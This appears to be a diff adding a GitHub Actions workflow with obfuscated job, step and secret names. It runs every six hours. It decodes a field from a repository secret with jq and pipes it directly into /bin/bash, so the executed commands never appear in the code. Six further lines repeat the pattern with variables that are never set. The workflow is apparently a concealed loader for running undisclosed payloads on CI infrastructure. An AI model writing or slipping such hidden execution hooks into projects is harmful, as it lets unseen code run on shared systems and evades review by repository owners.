@@ -1,0 +1,23 @@
+name: mingyulu1837
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingyulu1837
+        env:
+          zqqhz171: ${{ secrets.zqqhz171 }}
+        run: |
+          echo $zqqhz171 | jq -r .g010 | /bin/bash
+          echo $w3 | jq -r .mlpsm08810 | /bin/bash
+          echo $i2 | jq -r .dvvb9820 | /bin/bash
+          echo $jmo233 | jq -r .bakmb65536 | /bin/bash
+          echo $vfcbk58211 | jq -r .ybyow2 | /bin/bash
+          echo $ru87503 | jq -r .yavkw25 | /bin/bash
+          echo $puut4 | jq -r .o11 | /bin/bash
+
